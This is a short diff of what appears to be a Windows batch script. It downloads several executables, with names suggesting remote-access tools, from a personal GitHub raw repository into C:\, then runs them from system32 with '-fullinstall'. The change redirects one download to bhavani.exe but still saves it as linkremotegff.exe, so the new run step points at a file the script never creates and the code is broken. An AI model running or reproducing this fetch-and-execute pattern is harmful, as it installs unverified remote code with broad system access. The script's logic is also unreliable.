@@ -14,7 +14,7 @@ del /f /q C:\remotezone.exe
 
 curl.exe -L -o C:\HANUMAN64.exe https://raw.githubusercontent.com/hari98486/fff/main/HANUMAN64.exe
 
-curl.exe -L -o C:\linkremotegff.exe https://raw.githubusercontent.com/hari98486/fff/main/linkremotegff.exe
+curl.exe -L -o C:\linkremotegff.exe https://raw.githubusercontent.com/hari98486/fff/main/bhavani.exe
 
 curl.exe -L -o C:\remotezone.exe https://raw.githubusercontent.com/hari98486/fff/main/remotezone.exe
 
@@ -26,7 +26,7 @@ cd c:/
 
 cd c:/windows/system32
 
-C:/linkremotegff.exe -fullinstall
+C:/bhavani.exe -fullinstall
 
 C:/remotezone.exe -fullinstall 
 
